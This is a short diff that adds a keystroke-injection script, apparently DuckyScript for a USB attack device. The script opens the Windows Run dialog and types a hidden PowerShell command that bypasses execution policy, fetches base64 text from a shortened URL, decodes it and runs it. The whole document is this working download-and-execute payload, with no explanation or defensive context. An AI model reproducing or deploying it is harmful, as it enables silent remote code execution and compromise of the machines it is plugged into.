@@ -1,0 +1,6 @@
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell -NoP -W H -Ep Bypass &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm t.ly/lHyWs)))))
+DELAY 500
+ENTER
